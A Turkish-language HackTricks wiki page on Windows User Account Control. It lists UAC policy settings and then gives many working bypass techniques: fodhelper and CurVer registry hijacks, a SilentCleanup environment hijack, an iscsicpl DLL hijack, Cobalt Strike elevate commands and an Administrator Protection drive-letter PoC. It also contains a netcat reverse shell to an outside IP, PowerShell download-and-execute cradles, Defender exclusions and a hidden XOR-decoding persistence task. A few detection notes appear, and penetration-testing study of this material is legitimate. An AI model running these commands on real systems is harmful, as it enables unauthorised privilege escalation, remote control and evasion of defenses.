# UAC - User Account Control

{{#include ../../banners/hacktricks-training.md}}

## UAC

[User Account Control (UAC)](https://docs.microsoft.com/en-us/windows/security/identity-protection/user-account-control/how-user-account-control-works), **yükseltilmiş etkinlikler için bir onay istemi** sağlayan bir özelliktir. Uygulamaların farklı `integrity` seviyeleri vardır ve **yüksek seviyeye** sahip bir program, **sistemi potansiyel olarak tehlikeye atabilecek** görevleri gerçekleştirebilir. UAC etkin olduğunda, uygulamalar ve görevler, bir yönetici bu uygulamaların/görevlerin çalışabilmesi için sistemde yönetici düzeyinde erişime sahip olmasını açıkça yetkilendirmediği sürece **her zaman yönetici olmayan bir hesabın güvenlik bağlamı altında çalışır**. Bu, yöneticileri istemeden yapılan değişikliklerden koruyan bir kolaylık özelliğidir; ancak bir güvenlik sınırı olarak kabul edilmez.

integrity seviyeleri hakkında daha fazla bilgi için:


{{#ref}}
../windows-local-privilege-escalation/integrity-levels.md
{{#endref}}

UAC devrede olduğunda, bir yönetici kullanıcıya 2 token verilir: normal işlemleri medium integrity seviyesinde gerçekleştirmek için standart kullanıcı token'ı ve admin ayrıcalıklarına sahip bir token.

Bu [sayfa](https://docs.microsoft.com/en-us/windows/security/identity-protection/user-account-control/how-user-account-control-works), oturum açma süreci, kullanıcı deneyimi ve UAC mimarisi dahil olmak üzere UAC'nin nasıl çalıştığını ayrıntılı biçimde açıklar. Yöneticiler, UAC'nin kuruluşlarına özgü şekilde nasıl çalışacağını yerel düzeyde (secpol.msc kullanarak) yapılandırmak için güvenlik politikalarını kullanabilir veya Active Directory domain ortamında Group Policy Objects (GPO) aracılığıyla yapılandırıp dağıtabilir. Çeşitli ayarlar [burada](https://docs.microsoft.com/en-us/windows/security/identity-protection/user-account-control/user-account-control-security-policy-settings) ayrıntılı olarak ele alınmıştır. UAC için ayarlanabilecek 10 Group Policy ayarı vardır. Aşağıdaki tablo ek ayrıntılar sunar:

| Group Policy Setting                                                                                                                                                                                                                                                                                                                                                           | Registry Key                | Default Setting                                              |
| ------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------ | --------------------------- | ------------------------------------------------------------ |
| [User Account Control: Admin Approval Mode for the built-in Administrator account](https://docs.microsoft.com/en-us/windows/security/identity-protection/user-account-control/user-account-control-security-policy-settings#user-account-control-admin-approval-mode-for-the-built-in-administrator-account)                                                                                                           | `HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System\FilterAdministratorToken`   | `0` (Disabled)                                             |
| [User Account Control: Behavior of the elevation prompt for administrators in Admin Approval Mode](https://docs.microsoft.com/en-us/windows/security/identity-protection/user-account-control/user-account-control-security-policy-settings#user-account-control-behavior-of-the-elevation-prompt-for-administrators-in-admin-approval-mode)                                                                     | `HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System\ConsentPromptBehaviorAdmin` | `5` (Prompt for consent for non-Windows binaries on the secure desktop) |
| [User Account Control: Behavior of the elevation prompt for standard users](https://docs.microsoft.com/en-us/windows/security/identity-protection/user-account-control/user-account-control-security-policy-settings#user-account-control-behavior-of-the-elevation-prompt-for-standard-users)                                                                                                             | `HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System\ConsentPromptBehaviorUser`  | `1` (Prompt for credentials on the secure desktop)         |
| [User Account Control: Detect application installations and prompt for elevation](https://docs.microsoft.com/en-us/windows/security/identity-protection/user-account-control/user-account-control-security-policy-settings#user-account-control-detect-application-installations-and-prompt-for-elevation)                                                                                                 | `HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System\EnableInstallerDetection`   | `1` (Enabled; disabled by default on Enterprise)           |
| [User Account Control: Only elevate executables that are signed and validated](https://docs.microsoft.com/en-us/windows/security/identity-protection/user-account-control/user-account-control-security-policy-settings#user-account-control-only-elevate-executables-that-are-signed-and-validated)                                                             | `HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System\ValidateAdminCodeSignatures` | `0` (Disabled)                                             |
| [User Account Control: Only elevate UIAccess applications that are installed in secure locations](https://docs.microsoft.com/en-us/windows/security/identity-protection/user-account-control/user-account-control-security-policy-settings#user-account-control-only-elevate-uiaccess-applications-that-are-installed-in-secure-locations)                                                             | `HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System\EnableSecureUIAPaths`       | `1` (Enabled)                                              |
| [User Account Control: Run all administrators in Admin Approval Mode](https://docs.microsoft.com/en-us/windows/security/identity-protection/user-account-control/user-account-control-security-policy-settings#user-account-control-run-all-administrators-in-admin-approval-mode)                                                                                                                            | `HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System\EnableLUA`                  | `1` (Enabled)                                              |
| [User Account Control: Allow UIAccess applications to prompt for elevation without using the secure desktop](https://docs.microsoft.com/en-us/windows/security/identity-protection/user-account-control/user-account-control-security-policy-settings#user-account-control-allow-uiaccess-applications-to-prompt-for-elevation-without-using-the-secure-desktop)                                   | `HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System\EnableUIADesktopToggle`     | `0` (Disabled)                                             |
| [User Account Control: Switch to the secure desktop when prompting for elevation](https://docs.microsoft.com/en-us/windows/security/identity-protection/user-account-control/user-account-control-security-policy-settings#user-account-control-switch-to-the-secure-desktop-when-prompting-for-elevation)                                                                               | `HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System\PromptOnSecureDesktop`      | `1` (Enabled)                                              |
| [User Account Control: Virtualize file and registry write failures to per-user locations](https://docs.microsoft.com/en-us/windows/security/identity-protection/user-account-control/user-account-control-security-policy-settings#user-account-control-virtualize-file-and-registry-write-failures-to-per-user-locations)                                                                     | `HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System\EnableVirtualization`       | `1` (Enabled)                                              |

### Windows'ta software yükleme politikaları

**local security policies** (çoğu sistemde "secpol.msc"), varsayılan olarak **admin olmayan kullanıcıların software yüklemesi gerçekleştirmesini engelleyecek** şekilde yapılandırılmıştır. Bu, admin olmayan bir kullanıcı software'iniz için installer'ı indirebilse bile, bir admin hesabı olmadan onu çalıştıramayacağı anlamına gelir.

### UAC'nin Elevation İstemesini Zorlamak için Registry Key'leri

Admin hakları olmayan standart bir kullanıcı olarak, "standart" hesabın belirli eylemleri gerçekleştirmeye çalıştığında **UAC tarafından credential istenmesini** sağlayabilirsiniz. Bu işlem, belirli **registry key'lerinin** değiştirilmesini gerektirir; bunun için admin izinlerine ihtiyacınız vardır. Ancak bir **UAC bypass** mevcutsa veya saldırgan zaten admin olarak oturum açmışsa bu geçerli değildir.

Kullanıcı **Administrators** grubunda olsa bile bu değişiklikler, yönetimsel eylemleri gerçekleştirebilmek için kullanıcının **hesap kimlik bilgilerini yeniden girmesini** zorunlu kılar.

**Pratikte bu yalnızca zaten elevated bir token'a, bir UAC bypass'ına veya bu key'leri değiştirmenize izin veren bir yanlış yapılandırmaya sahipseniz işe yarar; aksi takdirde registry write işlemi engellenir.**

Değiştirmeniz gereken registry key ve entry'ler (varsayılan değerleri parantez içinde) şunlardır:

- `HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System`:
- `ConsentPromptBehaviorUser` = 1 (3)
- `ConsentPromptBehaviorAdmin` = 1 (5)
- `PromptOnSecureDesktop` = 1 (1)

Bu işlem Local Security Policy aracı üzerinden manuel olarak da yapılabilir. Değiştirildikten sonra yönetimsel işlemler, kullanıcının credential'larını yeniden girmesini ister.

### Not

**User Account Control bir güvenlik sınırı değildir.** Bu nedenle standart kullanıcılar, local privilege escalation exploit'i olmadan hesaplarından çıkıp admin hakları elde edemez.

### Bir kullanıcıdan 'full computer access' isteme
```powershell
hostname | Set-Clipboard
Enable-PSRemoting -SkipNetworkProfileCheck -Force

cd C:\Users\hacedorderanas\Desktop
New-PSSession -Name "Case ID: 1527846" -ComputerName hostname
Enter-PSSession -ComputerName hostname
```
### UAC Privileges

- Internet Explorer Protected Mode, yüksek bütünlük düzeyindeki işlemlerin (web tarayıcıları gibi) düşük bütünlük düzeyindeki verilere (geçici Internet dosyaları klasörü gibi) erişmesini önlemek için bütünlük denetimlerini kullanır. Bu işlem, tarayıcının düşük bütünlüklü bir token ile çalıştırılmasıyla gerçekleştirilir. Tarayıcı, düşük bütünlük bölgesinde depolanan verilere erişmeye çalıştığında işletim sistemi işlemin bütünlük düzeyini denetler ve erişime buna göre izin verir. Bu özellik, remote code execution saldırılarının sistemdeki hassas verilere erişmesini önlemeye yardımcı olur.
- Bir kullanıcı Windows'a log on olduğunda sistem, kullanıcının ayrıcalıklarının listesini içeren bir access token oluşturur. Ayrıcalıklar, kullanıcının hakları ve yeteneklerinin birleşimi olarak tanımlanır. Token ayrıca kullanıcının credentials listesini de içerir; bunlar kullanıcının bilgisayara ve ağ üzerindeki kaynaklara kimlik doğrulaması yapmak için kullanılan credentials'lardır.

### Autoadminlogon

Windows'u başlangıçta belirli bir kullanıcıyla otomatik olarak log on olacak şekilde yapılandırmak için **`AutoAdminLogon` registry key** değerini ayarlayın. Bu, kiosk ortamları veya test amaçları için kullanışlıdır. Parolayı registry'de açığa çıkardığından bunu yalnızca güvenli sistemlerde kullanın.

Aşağıdaki key'leri Registry Editor veya `reg add` kullanarak ayarlayın:

- `HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon`:
- `AutoAdminLogon` = 1
- `DefaultUsername` = username
- `DefaultPassword` = password

Normal logon davranışına dönmek için `AutoAdminLogon` değerini 0 olarak ayarlayın.

## UAC bypass

> [!TIP]
> Victim'a graphical access'iniz varsa UAC bypass işleminin kolay olduğunu unutmayın; UAC prompt'u göründüğünde "Yes" seçeneğine tıklamanız yeterlidir.

UAC bypass şu durumda gereklidir: **UAC etkin, process'iniz medium integrity context içinde çalışıyor ve kullanıcınız administrators grubuna dahil.**

UAC en yüksek security level'da (Always) olduğunda, diğer level'lardan (Default) herhangi birinde olduğuna kıyasla **bypass edilmesinin çok daha zor** olduğunu belirtmek önemlidir.

### Medium-integrity shell üzerinden hızlı triage

Bir bypass denemeden önce doğru senaryoda olduğunuzu doğrulayın ve host build'ini bilinen çalışan yöntemlerle eşleştirin:
```powershell
whoami /groups
reg query HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System /v EnableLUA
reg query HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System /v ConsentPromptBehaviorAdmin
reg query HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System /v PromptOnSecureDesktop
powershell -c "Get-ItemProperty 'HKLM:\SOFTWARE\Microsoft\Windows NT\CurrentVersion' | select ProductName,DisplayVersion,CurrentBuild,UBR"
schtasks /Query /TN "\Microsoft\Windows\DiskCleanup\SilentCleanup"
```
Pratik notlar:
- `EnableLUA=0` ise bir bypass'a ihtiyacınız yoktur: herhangi bir admin token doğrudan high integrity talep edebilir.
- `ConsentPromptBehaviorAdmin=2` veya `5`, auto-elevate / COM-based bypasses için yaygın senaryodur.
- `Always Notify` çıtayı yükseltir, ancak başarısız olduğunu varsaymak yerine yine de tam build'i test etmelisiniz: UACME, modern Windows build'lerinde hâlâ bazı `AlwaysNotify compatible` method'larını takip eder.

### UAC devre dışı

UAC zaten devre dışıysa (`ConsentPromptBehaviorAdmin` **`0`**), aşağıdakine benzer bir yöntem kullanarak **admin privileges ile bir reverse shell çalıştırabilirsiniz** (high integrity level):
```bash
#Put your reverse shell instead of "calc.exe"
Start-Process powershell -Verb runAs "calc.exe"
Start-Process powershell -Verb runAs "C:\Windows\Temp\nc.exe -e powershell 10.10.14.7 4444"
```
#### UAC bypass with token duplication

- [https://ijustwannared.team/2017/11/05/uac-bypass-with-token-duplication/](https://ijustwannared.team/2017/11/05/uac-bypass-with-token-duplication/)
- [https://www.tiraniddo.dev/2018/10/farewell-to-token-stealing-uac-bypass.html](https://www.tiraniddo.dev/2018/10/farewell-to-token-stealing-uac-bypass.html)

### **Çok** Temel UAC "bypass" (tam dosya sistemi erişimi)

Administrators grubunun içinde bulunan bir kullanıcıyla bir shell'iniz varsa, SMB üzerinden paylaşılan **C$**'ı (dosya sistemi) yeni bir diske yerel olarak **mount** edebilir ve **dosya sisteminin içindeki her şeye erişim** elde edebilirsiniz (Administrator ana klasörü dahil).

> [!WARNING]
> **Görünüşe göre bu trick artık çalışmıyor**
```bash
net use Z: \\127.0.0.1\c$
cd C$

#Or you could just access it:
dir \\127.0.0.1\c$\Users\Administrator\Desktop
```
### Cobalt Strike ile UAC bypass

Cobalt Strike teknikleri, UAC en yüksek güvenlik seviyesine ayarlanmadıysa çalışır
```bash
# UAC bypass via token duplication
elevate uac-token-duplication [listener_name]
# UAC bypass via service
elevate svc-exe [listener_name]

# Bypass UAC with Token Duplication
runasadmin uac-token-duplication powershell.exe -nop -w hidden -c "IEX ((new-object net.webclient).downloadstring('http://10.10.5.120:80/b'))"
# Bypass UAC with CMSTPLUA COM interface
runasadmin uac-cmstplua powershell.exe -nop -w hidden -c "IEX ((new-object net.webclient).downloadstring('http://10.10.5.120:80/b'))"
```
**Empire** ve **Metasploit** ayrıca **UAC**'ı **bypass** etmek için çeşitli modüllere sahiptir.

### Elevated COM interfaces (`ICMLuaUtil` / `CMSTPLUA`)

Auto-elevated COM objects, modern build'lerde pratik bir UAC yüzeyi olmaya devam etmektedir. `ICMLuaUtil`, mevcut Windows branch'lerinde çalıştığı UACME tarafından hâlâ takip edilmektedir ve offensive tooling, COM Elevation Moniker'ı çağırmadan önce interactive desktop process, 64-bit execution ve bazen PEB/process masquerading'i birleştirerek `CMSTPLUA`'yı uyarlamaya devam etmektedir.

Practical tips:
- Kullanıcının **interactive session**'ında (genellikle `explorer.exe` veya onun bir child process'i) **64-bit** bir process'i tercih edin.
- Ham bir shell başarısız olursa naive bir `CreateProcess` wrapper yerine bir BOF / UACME implementation üzerinden tekrar deneyin.
- Child execution'ın **ayrı bir elevated process** içinde gerçekleşmesini bekleyin; birçok BOF mevcut beacon'ı yerinde elevate etmez.

### KRBUACBypass

Documentation and tool in [https://github.com/wh0amitz/KRBUACBypass](https://github.com/wh0amitz/KRBUACBypass)

### UAC bypass exploits

[**UACME** ](https://github.com/hfiref0x/UACME), çeşitli UAC bypass exploit'lerinin bir **compilation**'ıdır. **UACME'yi visual studio veya msbuild kullanarak compile etmeniz** gerektiğini unutmayın. Compilation, birkaç executable oluşturacaktır (örneğin `Source\Akagi\outout\x64\Debug\Akagi.exe`); **hangisine ihtiyacınız olduğunu** bilmeniz gerekecektir.\
Dikkatli **olmalısınız**, çünkü bazı bypass'ler, bir şeyler olduğunu **user**'a **bildirecek** ve onu **uyaracak** başka programları **prompt** edecektir.

UACME, her technique'in çalışmaya başladığı **build version**'ı içerir. Version'larınızı etkileyen bir technique arayabilirsiniz:
```powershell
PS C:\> [environment]::OSVersion.Version

Major  Minor  Build  Revision
-----  -----  -----  --------
10     0      14393  0
```
Ayrıca [bu](https://en.wikipedia.org/wiki/Windows_10_version_history) sayfayı kullanarak build sürümlerinden Windows sürümü `1607` elde edilir.

Pratik bir iş akışı, önce **host build'ini puanlamak**, ardından yalnızca eşleşen yöntemi çalıştırmaktır:
```cmd
python main.py --scan uac
Akagi64.exe 33 C:\Windows\System32\cmd.exe
```
- `WinPwnage`, yerel build'i bilinen UAC yöntemleriyle hızlıca karşılaştırır; bu, çalışmayan PoC'leri hızlıca elemek için kullanışlıdır.
- `UACME`, bir bypass yöntemini belirli bir build ile eşleştirmek için hâlâ en iyi public catalogue'dur. Güncel sürümler yeni yöntemler ekledi ve mevcut yöntemleri **Windows 11 25H2** üzerinde yeniden test etti; bu nedenle eski bir blog gönderisinin hâlâ değişiklik yapılmadan geçerli olduğunu varsaymadan önce README/release notes dosyalarını yeniden kontrol edin.

### UAC Bypass – fodhelper.exe (Registry hijack)

Güvenilir binary `fodhelper.exe`, modern Windows sistemlerinde auto-elevated olarak çalışır. Başlatıldığında, `DelegateExecute` verb'ünü doğrulamadan aşağıdaki per-user registry path'ini sorgular. Buraya bir command yerleştirmek, Administrators grubundaki bir kullanıcının Medium Integrity process'inin UAC prompt'u olmadan High Integrity process başlatmasını sağlar.

Registry path queried by fodhelper:
```text
HKCU\Software\Classes\ms-settings\Shell\Open\command
```
<details>
<summary>PowerShell adımları (payload'unuzu ayarlayın, ardından tetikleyin)</summary>
```powershell
# Optional: from a 32-bit shell on 64-bit Windows, spawn a 64-bit PowerShell for stability
C:\\Windows\\sysnative\\WindowsPowerShell\\v1.0\\powershell -nop -w hidden -c "$PSVersionTable.PSEdition"

# 1) Create the vulnerable key and values
New-Item -Path "HKCU:\Software\Classes\ms-settings\Shell\Open\command" -Force | Out-Null
New-ItemProperty -Path "HKCU:\Software\Classes\ms-settings\Shell\Open\command" -Name "DelegateExecute" -Value "" -Force | Out-Null

# 2) Set default command to your payload (example: reverse shell or cmd)
# Replace <BASE64_PS> with your base64-encoded PowerShell (or any command)
Set-ItemProperty -Path "HKCU:\Software\Classes\ms-settings\Shell\Open\command" -Name "(default)" -Value "powershell -ExecutionPolicy Bypass -WindowStyle Hidden -e <BASE64_PS>" -Force

# 3) Trigger auto-elevation
Start-Process -FilePath "C:\\Windows\\System32\\fodhelper.exe"

# 4) (Recommended) Cleanup
Remove-Item -Path "HKCU:\Software\Classes\ms-settings\Shell\Open" -Recurse -Force
```
</details>
Notlar:
- Geçerli kullanıcı Administrators üyesi olduğunda ve UAC seviyesi varsayılan/lenient olduğunda çalışır (ek kısıtlamalarla Always Notify değil).
- 64-bit Windows üzerinde 32-bit bir process içinden 64-bit PowerShell başlatmak için `sysnative` path'ini kullanın.
- Payload herhangi bir command olabilir (PowerShell, cmd veya bir EXE path'i). Stealth için prompting UI'larından kaçının.

#### CurVer/extension hijack varyantı (yalnızca HKCU)

`fodhelper.exe`'yi abuse eden güncel örnekler `DelegateExecute`'ten kaçınır ve bunun yerine per-user `CurVer` value'su üzerinden **`ms-settings` ProgID'sini redirect eder**. Auto-elevated binary handler'ı hâlâ `HKCU` altında resolve ettiğinden, key'leri yerleştirmek için admin token gerekmez:
```powershell
# Point ms-settings to a custom extension (.thm) and map that extension to our payload
New-Item -Path "HKCU:\Software\Classes\.thm\Shell\Open" -Force | Out-Null
New-ItemProperty -Path "HKCU:\Software\Classes\.thm\Shell\Open\command" -Name "(default)" -Value "C:\\ProgramData\\rKXujm.exe" -Force | Out-Null
Set-ItemProperty -Path "HKCU:\Software\Classes\ms-settings" -Name "CurVer" -Value ".thm" -Force

Start-Process "C:\\Windows\\System32\\fodhelper.exe"   # auto-elevates and runs rKXujm.exe
```
Yükseltilmiş ayrıcalıklar elde edildikten sonra malware, genellikle `HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System\ConsentPromptBehaviorAdmin` değerini `0` olarak ayarlayarak **gelecekteki istemleri devre dışı bırakır**; ardından ek defense evasion işlemleri gerçekleştirir (ör. `Add-MpPreference -ExclusionPath C:\ProgramData`) ve yüksek bütünlük düzeyinde çalışmak için persistence mekanizmasını yeniden oluşturur. Tipik bir persistence görevi, diskte **XOR ile şifrelenmiş bir PowerShell scripti** depolar ve her saat bunu bellekte decode edip çalıştırır:
```powershell
schtasks /create /sc hourly /tn "OneDrive Startup Task" /rl highest /tr "cmd /c powershell -w hidden $d=[IO.File]::ReadAllBytes('C:\ProgramData\VljE\zVJs.ps1');$k=[Text.Encoding]::UTF8.GetBytes('Q');for($i=0;$i -lt $d.Length;$i++){$d[$i]=$d[$i]-bxor$k[$i%$k.Length]};iex ([Text.Encoding]::UTF8.GetString($d))"
```
Bu varyant yine de dropper’ı temizler ve yalnızca staged payloads bırakır; bu nedenle detection, **`CurVer` hijack**, `ConsentPromptBehaviorAdmin` tampering, Defender exclusion oluşturulması veya PowerShell’i bellekte decrypt eden scheduled tasks izlemeye dayanır.

### `SilentCleanup` task üzerinden UAC bypass (`HKCU\Environment\windir`)

`SilentCleanup`, `cleanmgr.exe` dosyasını en yüksek ayrıcalıklarla başlatır ve `%windir%` değerini user environment içinden genişletir. `HKCU\Environment\windir` değerini kontrol ediyorsanız bu genişletmeyi arbitrary bir komuta yönlendirebilir ve consent dialog olmadan yüksek bütünlük düzeyi elde edebilirsiniz. UACME tekniği aktif tutmaya devam ettiği ve güncel issue tracking sonuçları Windows 11 24H2’nin yalnızca küçük quoting adjustments gerektirebileceğini gösterdiği için bu method recent builds üzerinde hâlâ test edilmeye değerdir.
```cmd
reg add "HKCU\Environment" /v windir /d "cmd.exe /c start powershell.exe" /f
schtasks /Run /TN "\Microsoft\Windows\DiskCleanup\SilentCleanup"
reg delete "HKCU\Environment" /v windir /f
```
Derleme üzerindeki görev yolu tırnak içine alıyorsa payload'u tırnakla bitecek şekilde yeniden deneyin (örneğin `cmd.exe"`). Testten sonra her zaman `HKCU\Environment\windir` değerini temizleyin.

#### Daha fazla UAC bypass

UI akışlarını, COM nesnelerini veya masaüstü etkileşimini abuse eden birçok klasik UAC bypass yöntemi, victim ile **tam etkileşimli bir session** gerektirir; yaygın bir `nc.exe` shell'i veya **Session 0** içinde çalışan bir service çoğu zaman yeterli değildir.

Bunu genellikle bir **meterpreter** session kullanarak çözebilirsiniz. **Session** değerinin **1** olduğu bir **process**'e migrate edin:

![ms-settings'i özel bir uzantıya (.thm) yönlendirin ve bu uzantıyı payload'umuza map edin - Daha fazla UAC bypass: Bir meterpreter session kullanarak bunu elde edebilirsiniz. Session değerine sahip bir process'e migrate edin...](<../../images/image (863).png>)

(_explorer.exe_ çalışmalıdır)

### GUI ile UAC Bypass

Bir **GUI** erişiminiz varsa, UAC prompt'u göründüğünde **kabul edebilirsiniz**; teknik bir bypass'a gerçekten ihtiyacınız yoktur. Bu nedenle bir GUI session elde etmek, UAC'nin eklediği pratik zorluğu aşmak için genellikle yeterlidir.

Ayrıca birinin kullandığı bir GUI session elde ederseniz (muhtemelen RDP üzerinden), buradan **doğrudan admin olarak bir** **cmd** **çalıştırabileceğiniz**, **administrator olarak çalışan bazı tool'lar** bulunabilir; böylece UAC tarafından tekrar prompt gösterilmez. Örneğin [**https://github.com/oski02/UAC-GUI-Bypass-appverif**](https://github.com/oski02/UAC-GUI-Bypass-appverif). Bu biraz daha **stealthy** olabilir.

### Gürültülü brute-force UAC bypass

Gürültülü olmaktan endişe etmiyorsanız, kullanıcının kabul etmesine kadar **permission'ları yükseltmeyi isteyen** [**https://github.com/Chainski/ForceAdmin**](https://github.com/Chainski/ForceAdmin) gibi bir şeyi her zaman **çalıştırabilirsiniz**.

### Kendi bypass'ınız - Temel UAC bypass metodolojisi

**UACME**'ye bakarsanız, birçok UAC bypass yönteminin **DLL hijacking'i abuse ettiğini** (genellikle elevated bir binary'ye writable bir path'ten attacker-controlled bir DLL load ettirerek) fark edersiniz. [Bir DLL hijacking vulnerability'sini nasıl bulacağınızı öğrenmek için bunu okuyun](../windows-local-privilege-escalation/dll-hijacking/index.html).

1. **autoelevate** olacak bir binary bulun (çalıştırıldığında high integrity level'da çalıştığını kontrol edin).
2. Procmon ile **DLL Hijacking** için vulnerable olabilecek "**NAME NOT FOUND**" event'lerini bulun.
3. Muhtemelen DLL'i yazma izniniz olmayan bazı **protected path'lerin** (C:\Windows\System32 gibi) içine **yazmanız** gerekecektir. Bunu şu yöntemleri kullanarak bypass edebilirsiniz:
1. **wusa.exe**: Windows 7,8 ve 8.1. Bu tool, high integrity level'dan çalıştırıldığı için bir CAB file'ın içeriğini protected path'lerin içine extract etmenize izin verir.
2. **IFileOperation**: Windows 10.
4. DLL'inizi protected path'in içine copy edecek ve vulnerable, autoelevated binary'yi execute edecek bir **script** hazırlayın.

### Başka bir UAC bypass tekniği

Bir **autoElevated binary**'nin **execute edilecek** bir **binary** veya **command**'in **name/path** bilgisini **registry**'den **read** etmeye çalışıp çalışmadığını izlemekten oluşur (binary bu bilgiyi **HKCU** içinde arıyorsa bu daha ilginçtir).

### `SysWOW64\iscsicpl.exe` + user `PATH` DLL hijack ile UAC bypass

32-bit `C:\Windows\SysWOW64\iscsicpl.exe`, search order kullanarak `iscsiexe.dll` load etmesi için abuse edilebilecek **auto-elevated** bir binary'dir. Malicious bir `iscsiexe.dll`'yi **user-writable** bir folder'a yerleştirebilir ve ardından mevcut user `PATH`'ini (örneğin `HKCU\Environment\Path` üzerinden) bu folder'ın aranmasını sağlayacak şekilde modify edebilirseniz, Windows attacker DLL'ini elevated `iscsicpl.exe` process'inin içine **UAC prompt göstermeden** load edebilir.

Practical notlar:
- Bu, mevcut user **Administrators** grubundaysa ancak UAC nedeniyle **Medium Integrity** seviyesinde çalışıyorsa kullanışlıdır.
- Bu bypass için ilgili olan kopya **SysWOW64** kopyasıdır. **System32** kopyasını ayrı bir binary olarak değerlendirin ve davranışını bağımsız şekilde validate edin.
- Primitive, **auto-elevation** ile **DLL search-order hijacking** kombinasyonudur; bu nedenle diğer UAC bypass'ları için kullanılan ProcMon workflow'u eksik DLL load'ını validate etmekte faydalıdır.

Minimal akış:
```cmd
copy iscsiexe.dll %TEMP%\iscsiexe.dll
reg add "HKCU\Environment" /v Path /t REG_SZ /d "%TEMP%" /f
C:\Windows\System32\cmd.exe /c C:\Windows\SysWOW64\iscsicpl.exe
```
Detection fikirleri:
- `C:\Windows\SysWOW64\iscsicpl.exe` yürütülmesinin hemen öncesinde `reg add` / `HKCU\Environment\Path` kayıt defteri yazma işlemleri için alert oluşturun.
- `%TEMP%` veya `%LOCALAPPDATA%\Microsoft\WindowsApps` gibi **kullanıcı kontrollü** konumlarda `iscsiexe.dll` arayın.
- `iscsicpl.exe` başlatmalarını, beklenmeyen child process'ler veya normal Windows dizinleri dışından yapılan DLL yüklemeleriyle ilişkilendirin.

### Ayrı olarak incelenmeye değer daha yeni araştırmalar

2024 sonrası bazı chain'ler artık klasik `HKCU\Software\Classes` registry hijack'leri gibi görünmüyor. Örneğin activation-context cache poisoning, **drive remap** ve **DLL redirection** işlemlerini birleştirerek `ctfmon.exe` ve daha sonra `fodhelper.exe` gibi trusted UI / auto-elevated binary'ler üzerinden medium integrity'den high integrity'ye geçiş sağlayabilir. Büyük PoC'yi burada yinelemek yerine şu konumdaki kompakt payload örneklerine bakın:

{{#ref}}
../windows-local-privilege-escalation/windows-c-payloads.md
{{#endref}}

### Per-logon-session DOS device map üzerinden Administrator Protection (25H2) drive-letter hijack

Windows 11 25H2 üzerindeki tam `RAiLaunchAdminProcess` / UIAccess attack surface için özel sayfaya bakın:

{{#ref}}
../windows-local-privilege-escalation/uiaccess-admin-protection-bypass.md
{{#endref}}

Windows 11 25H2 “Administrator Protection”, per-session `\Sessions\0\DosDevices/<LUID>` map'lerine sahip shadow-admin token'ları kullanır. Dizin, ilk `\??` resolution işleminde `SeGetTokenDeviceMap` tarafından lazy olarak oluşturulur. Saldırgan shadow-admin token'ını yalnızca **SecurityIdentification** seviyesinde impersonate ederse dizin, saldırgan **owner** olacak şekilde oluşturulur (`CREATOR OWNER`'ı devralır); bu da `\GLOBAL??` üzerinde öncelik kazanan drive-letter link'lerine izin verir.

**Adımlar:**

1. Low-privileged bir session'dan, prompt içermeyen bir shadow-admin `runonce.exe` başlatmak için `RAiProcessRunOnce` çağırın.
2. Primary token'ını bir **identification** token'ına duplicate edin ve saldırgan sahipliği altında `\Sessions\0\DosDevices/<LUID>` oluşturulmasını zorlamak için `\??` açarken bu token'ı impersonate edin.
3. Burada attacker-controlled storage'a işaret eden bir `C:` symlink oluşturun; ardından bu session'daki filesystem erişimleri `C:` yolunu saldırganın path'ine resolve eder ve prompt olmadan DLL/file hijack yapılmasını sağlar.

**PowerShell PoC (NtObjectManager):**
```powershell
$pid = Invoke-RAiProcessRunOnce
$p = Get-Process -Id $pid
$t = Get-NtToken -Process $p
$id = New-NtTokenDuplicate -Token $t -ImpersonationLevel Identification
Invoke-NtToken $id -ImpersonationLevel Identification { Get-NtDirectory "\??" | Out-Null }
$auth = Get-NtTokenId -Authentication -Token $id
New-NtSymbolicLink "\Sessions\0\DosDevices/$auth/C:" "\??\\C:\\Users\\attacker\\loot"
```
## Referanslar
- [LOLBAS: Iscsicpl.exe](https://lolbas-project.github.io/lolbas/Binaries/Iscsicpl/)
- [Microsoft Docs – User Account Control nasıl çalışır](https://learn.microsoft.com/windows/security/identity-protection/user-account-control/how-user-account-control-works)
- [UACME – UAC bypass teknikleri koleksiyonu](https://github.com/hfiref0x/UACME)
- [WinPwnage – UAC bypass uyumluluk tarayıcısı ve başlatıcısı](https://github.com/rootm0s/WinPwnage)
- [Checkpoint Research – KONNI, PowerShell Backdoor'ları oluşturmak için AI kullanıyor](https://research.checkpoint.com/2026/konni-targets-developers-with-ai-malware/)
- [Check Point Research – Operation TrueChaos: Güneydoğu Asya hükümet hedeflerine karşı 0-Day exploitation](https://research.checkpoint.com/2026/operation-truechaos-0-day-exploitation-against-southeast-asian-government-targets/)
- [Project Zero – Windows Administrator Protection'ı bypass etme](https://projectzero.google/2026/26/windows-administrator-protection.html)
- [Project Zero – UI Access'i kötüye kullanarak Administrator Protection'ı bypass etme](https://projectzero.google/2026/02/windows-administrator-protection.html)
- [Sigma / Detection.FYI – SilentCleanup Task kullanarak UAC bypass](https://detection.fyi/sigmahq/sigma/windows/registry/registry_set/registry_set_bypass_uac_using_silentcleanup_task/)

{{#include ../../banners/hacktricks-training.md}}
